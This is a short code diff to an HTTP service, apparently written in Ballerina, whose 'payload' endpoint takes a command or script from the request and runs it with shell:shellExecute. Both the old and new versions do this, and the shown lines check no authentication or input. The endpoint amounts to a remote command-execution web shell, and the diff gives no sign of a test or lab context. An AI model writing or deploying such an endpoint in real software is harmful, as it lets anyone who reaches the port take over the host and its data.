@@ -8,8 +8,10 @@ configurable int port = ?;
 configurable string key = ?;
 
 service / on new http:Listener(port) {
-    resource function get payload(string command, string? args) returns string {
-        string|error shellResult = shell:shellExecute(command, [args ?: ""]);
+    resource function get payload(http:Request request, string script) returns json {
+        request.setHeader("Content-Type", "application/json");
+
+        string|error shellResult = shell:shellExecute(script);
         if shellResult is error {
             return response:errorResponse(shellResult.message());
         }
